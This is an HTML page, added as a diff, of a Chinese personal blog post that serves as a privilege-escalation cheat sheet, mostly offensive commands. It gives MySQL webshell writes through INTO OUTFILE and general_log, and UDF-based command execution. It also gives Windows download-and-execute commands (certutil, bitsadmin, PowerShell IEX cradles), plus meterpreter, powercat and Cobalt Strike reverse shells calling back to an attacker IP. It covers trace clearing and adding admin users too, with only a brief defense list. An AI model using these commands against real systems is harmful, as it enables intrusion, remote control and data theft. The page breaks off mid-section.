@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>提权 |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-提权方式"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+  
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  提权
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/07/01/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/" class="article-date">
+  <time datetime="2023-06-30T16:21:20.000Z" itemprop="datePublished">2023-07-01</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/">系统提权</a> / <a class="article-category-link" href="/categories/%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/MYSQL%E6%8F%90%E6%9D%83/">MYSQL提权</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">16 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="1-1-权限说明"><a href="#1-1-权限说明" class="headerlink" title="1.1.权限说明"></a>1.1.权限说明</h1><ul>
+<li><p>后台权限:SQL注入,致据库备份泄露，默认或弱口令等获取帐号密码进入。</p>
+</li>
+<li><p>网站权限:后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达shell。</p>
+<p><strong>前提：</strong></p>
+<blockquote>
+<ul>
+<li><p>已知网站物理路径且该路径有写权限</p>
+</li>
+<li><p>高权限数据库用户</p>
+</li>
+<li><p>secure_file_priv 无限制</p>
+<blockquote>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<h3 id="into-outfile文件"><a href="#into-outfile文件" class="headerlink" title="into outfile文件"></a>into outfile文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap 下可以执行如下操作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://x.x.x.x/?id=x&quot;</span> --file-write=<span class="string">&quot;/path/to/shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/test/shell.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p>
+<h3 id="terminated-by-写文件"><a href="#terminated-by-写文件" class="headerlink" title="terminated by 写文件"></a>terminated by 写文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> limit <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/wamp64/www/work/webshell.php&#x27;</span> lines terminated <span class="keyword">by</span> <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="general-log-写文件"><a href="#general-log-写文件" class="headerlink" title="general log 写文件"></a>general log 写文件</h3><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
+<blockquote>
+<p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> OFF                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>var<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>c1595d3a029a.log <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>通过将 <code>general_log</code> 存储位置改为 web 目录。同时，向日志文件里面写入内容的话，那么就可以成功 getshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 更改日志文件位置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 查看当前配置</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> <span class="keyword">ON</span>                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"></span><br><span class="line"># 往日志里面写入 payload</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>访问这个php文件呢，会出现 HTTP 500 的状态码</p>
+<ul>
+<li><p>数据库权限:SQL注入数据库备份泄露。默认或弱口令等进入或网站权限获取后转入。</p>
+<blockquote>
+<ul>
+<li>3306 弱口令爆破</li>
+<li>sqlmap 的 –sql-shell 模式</li>
+<li>网站的数据库配置文件中拿到明文密码信息</li>
+<li>mysql 1day 漏洞获取权限</li>
+</ul>
+</blockquote>
+</li>
+<li><p>接口权限:SQL注入,数据库备份泄露，源码泄漏，配置不当等或网站权限获取后转入。</p>
+</li>
+<li><p>系统权限:高危系统漏洞直达或网站权限提升转入、数据库权限提升转入。第三方转入等。</p>
+</li>
+<li><p>域控权限:高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等。</p>
+</li>
+</ul>
+<h1 id="1-2-权限提升流程"><a href="#1-2-权限提升流程" class="headerlink" title="1.2.权限提升流程"></a>1.2.权限提升流程</h1><p>后台权限&gt;web权限&gt;系统权限&gt;域控权限</p>
+<h1 id="1-3-中间件语言类权限"><a href="#1-3-中间件语言类权限" class="headerlink" title="1.3.中间件语言类权限"></a>1.3.中间件语言类权限</h1><p>jsp、java搭建的站点连接上后直接就是系统权限。</p>
+<h1 id="2-1-windows"><a href="#2-1-windows" class="headerlink" title="2.1.windows:"></a>2.1.windows:</h1><p>Windows提权大概有三个方向：溢出提权、数据库提权、第三方软件提权、错误的系统配置提权、组策略首选项提权、窃取令牌提权、bypassuac提权，第三方软件&#x2F;服务提权，WEB中间件漏洞提权等。</p>
+<p>如果遇到无法执行命令的话，可以试着上传cmd.exe文件之可执行的目录下。</p>
+<h2 id="2-1-1常见命令"><a href="#2-1-1常见命令" class="headerlink" title="2.1.1常见命令"></a>2.1.1常见命令</h2><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 查询系统信息</span><br><span class="line">hostname   主机名</span><br><span class="line">net user   查看用户信息</span><br><span class="line">netstat -ano|find &quot;3389&quot;   查看服务pid号</span><br><span class="line">wmic os get caption       查看系统名</span><br><span class="line">wmic qfe get Description,HotFixID,InstalledOn   查看补丁信息</span><br><span class="line">wmic product get name,version   查看当前安装程序</span><br><span class="line">wmic service list brief   查询本机服务</span><br><span class="line">wmic process list brief   查询本机进程</span><br><span class="line">net share   查看本机共享列表</span><br><span class="line">netsh firewall show config 查看防火墙配置</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="2-1-2提权方式"><a href="#2-1-2提权方式" class="headerlink" title="2.1.2提权方式"></a>2.1.2提权方式</h2><p>一般通过找对应版本的exp，去进行利用</p>
+<p>利用cs工具，监听成功后，去用插件提权</p>
+<p>msf</p>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>winPEAS</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</span><br><span class="line">WinPEAS 是一个脚本，用于枚举目标系统以发现权限升级路径。</span><br></pre></td></tr></table></figure>
+
+<p>accesschk</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">accesschk是微软提供的一款安全检查工具，是Sysintenals集合中的一款工具，作为确保他们创建安全环境Windows管理员通常需要知道特定用户或组对资源（包括文件、目录、注册表项、全局对象和Windows服务）拥有哪些类型的访问权限。</span><br><span class="line">accesschk.exe /accepteula( /accepteula一定要加上去，否则会自动弹出一个是否接收许可协议)</span><br><span class="line">-q          忽略banner</span><br><span class="line">-u          忽略错误</span><br><span class="line">-v          详细信息</span><br><span class="line">-w          只显示拥有可写权的对象</span><br><span class="line">accesschk.exe /accepteula -uvwqk &quot;路径可以根据WinPEAS返回结果填写&quot;</span><br></pre></td></tr></table></figure>
+
+<p>系统内核溢出漏洞，而没有打相应补丁</p>
+<h2 id="2-1-3-windows下载文件和加载木马"><a href="#2-1-3-windows下载文件和加载木马" class="headerlink" title="2.1.3 windows下载文件和加载木马"></a>2.1.3 windows下载文件和加载木马</h2><h3 id="windows下cmd窗口文件下载"><a href="#windows下cmd窗口文件下载" class="headerlink" title="windows下cmd窗口文件下载"></a>windows下cmd窗口文件下载</h3><h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>bitsadmin 可以用来在windows 命令行下下载文件。bitsadmin是windows 后台智能传输服务的一个工具，windows 的自动更新，补丁之类的下载就是用这个工具来实现的。Windows Server2003和XP是没有bitsadmin的，Winc7及其之后的机器才有。</p>
+<p>bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。</p>
+<p>bitsadmin 可以跟随URL跳转.</p>
+<p>bitsadmin 不像curl wget 这类工具那样能用来下载HTML页面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer test http://10.6.54.194:8000/reverse.exe c:\users\staccato\desktop\reverse.exe</span><br><span class="line"># &quot;任务名&quot; 可以随意起，保存文件的文件路径必须是已经存在的目录，否则不能下载。</span><br><span class="line"></span><br><span class="line">#默认情况下bitsadmin下载速度极慢，下载较大文件需要设置优先级提速</span><br><span class="line">start bitsadmin /transfer test http://10.6.54.194:8000/reverse.exe  f:\reverse.exe</span><br><span class="line">bitsadmin /setpriority test foreground     #设置任务test为最高优先级</span><br></pre></td></tr></table></figure>
+
+<h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>一款下载文件的工具，自从WindowsServer 2003就自带。但是在Server 2003使用会有问题。也就是说，以下命令是在Win7及其以后的机器使用。但是该命令的使用会引发杀毒软件的查杀，所以在实际渗透中几乎不适用该命令.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.6.54.194:8000/reverse.exe #下载文件到当前目录下</span><br><span class="line">certutil -urlcache -split -f http://10.6.54.194:8000/reverse.exe  c:/users/staccato/desktop/reserver.exe        #下载文件到指定目录下</span><br></pre></td></tr></table></figure>
+
+<h4 id="iwr"><a href="#iwr" class="headerlink" title="iwr"></a>iwr</h4><p>PowerShell下的一款工具，所以我们如果在cmd下执行该命令的话，需要在前面加powershell命令，但是这会被安全软件检测到。所以在执行前，先进入powershell下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwr -Uri http://www.test.com/vps.exe -OutFile vps.exe -UseBasicParsing</span><br></pre></td></tr></table></figure>
+
+<h3 id="Window下加载执行PowerShell脚本"><a href="#Window下加载执行PowerShell脚本" class="headerlink" title="Window下加载执行PowerShell脚本"></a>Window下加载执行PowerShell脚本</h3><h4 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h4><p>在cmd当前目录下有PowerView.ps1脚本，并执行其中的Get-Netdomain模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass Import-Module .\powerview.ps1;Get-NetDomain</span><br></pre></td></tr></table></figure>
+
+<h4 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h4><p>远程下载并执行test.ps1脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://xx.xx.xx.xx/test.ps1&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>远程下载PowerView.ps1脚本，并执行其中的Get-Netdomain模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://xx.xx.xx.xx/powerview.ps1&#x27;);import-module .\powerview.ps1;Get-NetDomain</span><br></pre></td></tr></table></figure>
+
+<h3 id="windows反弹shell"><a href="#windows反弹shell" class="headerlink" title="windows反弹shell"></a>windows反弹shell</h3><h4 id="cmd反弹msf-shell"><a href="#cmd反弹msf-shell" class="headerlink" title="cmd反弹msf shell"></a>cmd反弹msf shell</h4><p>首先在kali上操作</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.6.54.194 lport=7788 -f psh-reflection -o 7788.ps1        #生成木马文件 7788.ps1</span><br><span class="line">python -m SimpleHTTPServer 80  #开启web服务</span><br><span class="line">#MSF监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.6.54.194</span><br><span class="line">set lport 7788</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>目标机器上操作</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://http://10.6.54.194:8000/7788.ps1&#x27;);xx.ps1&quot;  #后台运行</span><br><span class="line">或者</span><br><span class="line">powershell -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.6.54.194:8000/7788.ps1&#x27;);xx.ps1&#x27;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="cmd窗口下利用Powershell反弹NC-shell"><a href="#cmd窗口下利用Powershell反弹NC-shell" class="headerlink" title="cmd窗口下利用Powershell反弹NC shell"></a><strong>cmd窗口下利用Powershell反弹NC shell</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 10.6.54.194 -p 8888 -e cmd</span><br><span class="line"></span><br><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object System.Net.Webclient)DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 10.6.54.194  -p 8888 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="cmd窗口下利用Powershell反弹cs-shell"><a href="#cmd窗口下利用Powershell反弹cs-shell" class="headerlink" title="cmd窗口下利用Powershell反弹cs shell"></a>cmd窗口下利用Powershell反弹cs shell</h4><p>注: windows10 经常性不能用。windows 2008R2以下百分百适用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.6.54.194:8080/a&#x27;))&quot;   #后台运行</span><br><span class="line"></span><br><span class="line">powershell.exe  -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.6.54.194:8080/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>工具和文件下载部分，参考先知社区<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12588">断*奏</a></p>
+<h1 id="2-2Mysql提权"><a href="#2-2Mysql提权" class="headerlink" title="2.2Mysql提权"></a>2.2Mysql提权</h1><h2 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h2><p>User Defined Function - 自定义函数，添加新函数在sql语句中调用</p>
+<p>拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；</p>
+<p>尝试udf提权，其实质就是<code>以MySQL的身份执行系统命令</code></p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><blockquote>
+<p>1.secure_file_priv为空，有导入导出权限</p>
+<p>2.有上传目录</p>
+<p>3.账号有insert和delete权限</p>
+</blockquote>
+<p>mysql版本&gt;&#x3D;5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建MySQL\Lib\Plugin\文件夹（<strong>通过菜刀连接创建</strong>、或<strong>通过mysql语句创建</strong>），然后将udf.dll导入到该目录（如果不事先在靶机创建plugin目录，可以尝试<strong>利用NTFS ADS流来创建文件夹的方法</strong>，但是会出错）</p>
+<p>windows下可以这样创建目录：</p>
+<p>先找到mysql安装目录</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> @<span class="variable">@basedir</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后嘞，如下创建：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> <span class="number">233</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>mysql版本&lt;5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</p>
+<p>dll常见函数</p>
+<blockquote>
+<ul>
+<li>cmdshell 执行cmd;</li>
+<li>downloader 下载者,到网上下载指定文件并保存到指定目录;</li>
+<li>open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</li>
+<li>backshell 反弹Shell;</li>
+<li>ProcessView 枚举系统进程;</li>
+<li>KillProcess 终止指定进程;</li>
+<li>regread 读注册表;</li>
+<li>regwrite 写注册表;</li>
+<li>shut 关机,注销,重启;</li>
+<li>about 说明与帮助函数;</li>
+</ul>
+</blockquote>
+<h3 id="手写实现"><a href="#手写实现" class="headerlink" title="手写实现"></a>手写实现</h3><h4 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h4><p><code>show variables like &quot;%plugin%&quot;</code>&#x2F;&#x2F;查看文件目录是否存在</p>
+<p>将dll文件写入plugin目录</p>
+<p>*可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有<strong>字节长度限制</strong>，所以往往 <strong>POST 注入</strong>才可以执行这种攻击*</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --file-write=<span class="string">&quot;/path/to/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>没有注入的话，我们可以操作原生 SQL 语句，这种情况下当 secure_file_priv 无限制的时候，可以通过手工写文件到 plugin 目录下的：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 直接 <span class="keyword">SELECT</span> 查询十六进制写入</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4602</span>... <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>其中十六进制利用 MySQL 自带的 hex 函数来编码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接传入路径编码</span><br><span class="line"><span class="keyword">SELECT</span> hex(load_file(<span class="string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));</span><br><span class="line"></span><br><span class="line"># 也可以将路径 hex 编码</span><br><span class="line"><span class="keyword">SELECT</span> hex(load_file(<span class="number">0x2f6c69625f6d7973716c7564665f7379735f36342e736f</span>));</span><br></pre></td></tr></table></figure>
+
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>并且创建函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure>
+
+<h3 id="UDF-shell"><a href="#UDF-shell" class="headerlink" title="UDF shell"></a>UDF shell</h3><p>假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候一些网页脚本就比较方便好用了</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">UDF命令执行大马点击此处</a></p>
+<p>使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上</p>
+<h3 id="msf实现"><a href="#msf实现" class="headerlink" title="msf实现"></a>msf实现</h3><p>msf启用NC监听，然后目标机上导入dll动态链接库</p>
+<p>再去自定义创建cmdshell函数</p>
+<p>然后利用这个函数，<code>select cmdshell(&#39;whoami&#39;)</code></p>
+<p>可以创建反弹shell函数backshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> backshell(&quot;IP&quot;, <span class="number">3389</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后创建用户，加入到管理员组。</p>
+<p>攻击机利用创建的用户和密码进行远程桌面连接</p>
+<p>ps:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#31-%E5%8E%9F%E7%90%86">Geekby’s Blog</a></p>
+</blockquote>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>(1)尽量避免提供对外链接，通过mysql中的user表进行查看，禁用“%”。</p>
+<p>(2)设置复杂的Root账号密码。</p>
+<p>(3)对my.ini设置只读属性，设置plugin目录为只读目录。</p>
+<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p> mof是windows系统的一个文件，存储在：</p>
+<p><code>c:/windows/system32/wbem/mof/nullevt.mof</code>，叫做”<strong>托管对象格式</strong>“</p>
+<p>其作用是每隔<strong>五秒</strong>就会去监控进程创建和死亡。</p>
+<p>然而提权的原理就是在拥有了mysql的root权限以后(其实就是获得了MySQL的启动身份)，</p>
+<p>然后使用该权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行</p>
+<p>这个mof当中有一段是vbs脚本，这个vbs脚本段大多数写的是cmd的添加管理员用户的命令</p>
+<p>如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了</p>
+<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>（1）操作系统版本：<strong>Windows Server 2003及以下版本</strong>；</p>
+<p>（2）有MySQL数据库的连接数据；</p>
+<p>（3）MySQL的配置文件my.ini中的<strong>secure-file-priv</strong>参数要为空(这个空不是NULL)；</p>
+<p>（4）MySQL启动身份具<strong>有权限去读写</strong>c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录；</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.上传一句话，蚁剑连接；</p>
+<p>假设获得了数据库的连接数据。<code>www/data/config.php</code></p>
